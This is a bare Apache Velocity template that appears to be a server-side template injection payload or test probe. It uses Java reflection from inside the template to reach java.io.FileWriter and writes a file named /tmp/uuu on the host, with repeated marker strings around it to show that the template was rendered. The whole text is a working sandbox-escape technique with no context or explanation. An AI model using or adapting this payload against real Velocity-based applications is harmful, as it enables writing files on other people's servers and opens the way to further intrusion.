#set( $monkey = '888888888888888888888888=========99999999999999999999999' )
$monkey
#set ($e="exp")
#set ($a=$e.getClass().forName("java.io.FileWriter"))
#set ($b = $a.FileWriter("/tmp/uuu"))
#set ($c = $b.write("zzz"))
#set ($d = $b.flush())
#set ($e = $b.close())
$monkey
